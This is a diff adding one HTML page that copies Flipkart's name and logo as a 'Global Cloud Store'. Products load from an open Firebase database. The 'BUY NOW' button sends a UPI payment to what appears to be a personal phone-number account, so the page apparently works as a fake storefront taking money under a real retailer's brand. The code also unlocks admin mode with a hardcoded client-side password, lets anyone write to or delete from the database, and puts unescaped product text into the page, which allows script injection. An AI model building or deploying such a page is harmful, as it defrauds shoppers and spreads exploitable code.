@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipkart | Global Cloud Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { background-color: #f1f3f6; font-family: 'Roboto', sans-serif; }
+        .fk-blue { background-color: #2874f0; }
+        #adminBtn { display: none; position: fixed; bottom: 80px; right: 20px; background: #2874f0; color: white; width: 56px; height: 56px; border-radius: 50%; justify-content: center; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 500; cursor: pointer; }
+        .gallery-container { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; height: 350px; }
+        .gallery-item { flex: 0 0 100%; scroll-snap-align: start; display: flex; justify-content: center; align-items: center; padding: 20px; background: white; }
+        .dot { width: 7px; height: 7px; border-radius: 50%; background: #ddd; }
+        .dot.active { background: #2874f0; width: 18px; border-radius: 10px; }
+    </style>
+</head>
+<body class="pb-20">
+
+    <header class="fk-blue p-3 sticky top-0 z-[100] text-white shadow-lg">
+        <div class="flex justify-between items-center mb-3">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bars" onclick="askAdmin()"></i>
+                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
+            </div>
+            <i class="fa-solid fa-cart-shopping"></i>
+        </div>
+        <div class="bg-white flex items-center px-4 py-2 rounded-sm text-black">
+            <input type="text" placeholder="Search Products..." class="w-full outline-none text-sm">
+        </div>
+    </header>
+
+    <main class="grid grid-cols-2 bg-gray-200 gap-[1px]" id="grid-view">
+        <div class="col-span-2 p-10 text-center">Loading Cloud Products...</div>
+    </main>
+
+    <div id="adminBtn" onclick="toggleForm()"><i class="fa-solid fa-plus text-xl"></i></div>
+
+    <div id="addForm" class="fixed inset-0 bg-black/60 z-[1000] hidden flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-lg p-6 space-y-3 overflow-y-auto max-h-[95vh]">
+            <h2 class="text-lg font-bold border-b pb-2">Add to Global Cloud</h2>
+            <input type="text" id="newTitle" placeholder="Product Title" class="w-full border p-2 rounded text-sm">
+            <input type="number" id="newPrice" placeholder="Price (₹)" class="w-full border p-2 rounded text-sm">
+            <textarea id="newGallery" placeholder="Image Link 1, Link 2..." class="w-full border p-2 rounded text-sm h-16"></textarea>
+            <textarea id="newDesc" placeholder="Description..." class="w-full border p-2 rounded text-sm h-20"></textarea>
+            <button onclick="addNewProduct()" id="uploadBtn" class="w-full fk-blue text-white py-3 font-bold rounded">Upload to All Devices</button>
+            <button onclick="toggleForm()" class="w-full text-gray-400 text-xs">Cancel</button>
+        </div>
+    </div>
+
+    <div id="pDetail" class="fixed inset-0 bg-white z-[200] hidden overflow-y-auto">
+        <nav class="p-4 border-b sticky top-0 bg-white z-[210] flex items-center">
+            <i class="fa-solid fa-arrow-left text-xl mr-4" onclick="closeDetail()"></i>
+            <span class="font-bold">Product Detail</span>
+        </nav>
+        <div id="detailContent"></div>
+    </div>
+
+    <script>
+        // 1. Firebase Config (Global Connection)
+        const firebaseConfig = { 
+            databaseURL: "https://flipkart-clone-test-default-rtdb.firebaseio.com/" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let isAdmin = false;
+
+        // 2. Admin Login
+        function askAdmin() {
+            let pass = prompt("Enter Secret Lock:");
+            if(pass === "947228") {
+                isAdmin = true;
+                document.getElementById('adminBtn').style.display = 'flex';
+                alert("Cloud Admin Enabled!");
+                fetchProducts(); // Refresh with delete buttons
+            }
+        }
+
+        // 3. Fetch from Cloud (This makes it show on Phone)
+        function fetchProducts() {
+            database.ref('cloud_products').on('value', (snapshot) => {
+                const data = snapshot.val();
+                const grid = document.getElementById('grid-view');
+                grid.innerHTML = "";
+                
+                if(!data) {
+                    grid.innerHTML = "<div class='col-span-2 p-10 text-center'>No Products in Cloud</div>";
+                    return;
+                }
+
+                Object.keys(data).reverse().forEach(key => {
+                    const p = data[key];
+                    grid.innerHTML += `
+                        <div class="bg-white p-3 border-b border-gray-100 relative">
+                            ${isAdmin ? `<button onclick="deleteProduct('${key}')" class="absolute top-2 right-2 bg-red-500 text-white p-2 rounded-full z-10 text-xs"><i class="fa-solid fa-trash"></i></button>` : ''}
+                            <div onclick='openDetail(${JSON.stringify(p)})'>
+                                <div class="h-40 flex items-center justify-center"><img src="${p.gallery[0]}" class="max-h-full"></div>
+                                <p class="text-xs mt-2 line-clamp-2">${p.name}</p>
+                                <p class="font-bold">₹${p.price}</p>
+                            </div>
+                        </div>`;
+                });
+            });
+        }
+
+        // 4. Add to Cloud
+        function addNewProduct() {
+            const btn = document.getElementById('uploadBtn');
+            const title = document.getElementById('newTitle').value;
+            const price = document.getElementById('newPrice').value;
+            const gallery = document.getElementById('newGallery').value.split(',').map(l => l.trim());
+            const desc = document.getElementById('newDesc').value;
+
+            if(!title || !price || !gallery[0]) return alert("Details missing!");
+
+            btn.innerText = "Uploading to Cloud...";
+            btn.disabled = true;
+
+            const newP = {
+                id: Date.now(),
+                name: title,
+                price: price,
+                gallery: gallery,
+                desc: desc || "No description."
+            };
+
+            // Saves to Firebase Cloud
+            database.ref('cloud_products').push(newP).then(() => {
+                btn.innerText = "Upload to All Devices";
+                btn.disabled = false;
+                toggleForm();
+                alert("Synced with all devices!");
+            });
+        }
+
+        // 5. Delete from Cloud
+        function deleteProduct(key) {
+            if(confirm("Remove from Cloud?")) {
+                database.ref('cloud_products/' + key).remove();
+            }
+        }
+
+        function toggleForm() { document.getElementById('addForm').classList.toggle('hidden'); }
+        function openDetail(p) {
+            // Detail logic same as yours but updated for UI
+            document.getElementById('pDetail').classList.remove('hidden');
+            document.getElementById('detailContent').innerHTML = `
+                <div class="gallery-container">${p.gallery.map(img => `<div class="gallery-item"><img src="${img}"></div>`).join('')}</div>
+                <div class="p-4">
+                    <h1 class="text-md font-medium">${p.name}</h1>
+                    <p class="text-2xl font-bold mt-2">₹${p.price}</p>
+                    <p class="mt-4 text-sm text-gray-600">${p.desc}</p>
+                    <button onclick="window.location.href='upi://pay?pa=8709615634-w350@ybl&am=${p.price}&cu=INR'" class="w-full bg-[#fb641b] text-white py-4 font-bold rounded mt-6">BUY NOW</button>
+                </div>`;
+        }
+        function closeDetail() { document.getElementById('pDetail').classList.add('hidden'); }
+
+        // Initial Start
+        fetchProducts();
+    </script>
+</body>
+</html>
